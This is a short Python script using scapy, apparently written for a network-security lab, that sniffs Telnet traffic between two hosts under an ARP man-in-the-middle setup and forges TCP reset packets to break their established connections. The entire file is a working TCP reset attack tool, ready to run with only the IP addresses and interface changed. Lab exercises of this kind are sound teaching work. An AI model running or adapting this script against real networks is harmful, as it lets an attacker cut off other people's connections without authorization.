#!/usr/bin/env python3
from scapy.all import *

# IPs from your ARP MITM setup
IP_A = "192.168.200.10"  # Telnet client
IP_B = "192.168.200.11"  # Telnet server
iface = "eth0"           # Your attacker interface inside the container

# Get attacker MAC to avoid reacting to own packets
ATTACKER_MAC = get_if_hwaddr(iface)

def rst_attack(pkt):
    if pkt.haslayer(Ether) and pkt[Ether].src == ATTACKER_MAC:
        return  # Skip our own packets

    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        if pkt[TCP].flags == "PA":  # Only reset established connections
            print(f"[+] Intercepted TCP packet {pkt[IP].src}:{pkt[TCP].sport} → {pkt[IP].dst}:{pkt[TCP].dport}")
            
            # Build the forged RST packet (reverse direction)
            ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
            tcp = TCP(
                sport=pkt[TCP].dport,
                dport=pkt[TCP].sport,
                flags="R",
                seq=pkt[TCP].ack  # Use ACK as SEQ for RST
            )
            rst_pkt = ip / tcp
            send(rst_pkt, verbose=0)
            print("[+] Sent forged RST to break the connection.")

# Sniff only Telnet (port 23) traffic between A and B
sniff(
    iface=iface,
    filter=f"tcp port 23 and host {IP_A} and host {IP_B}",
    prn=rst_attack
)
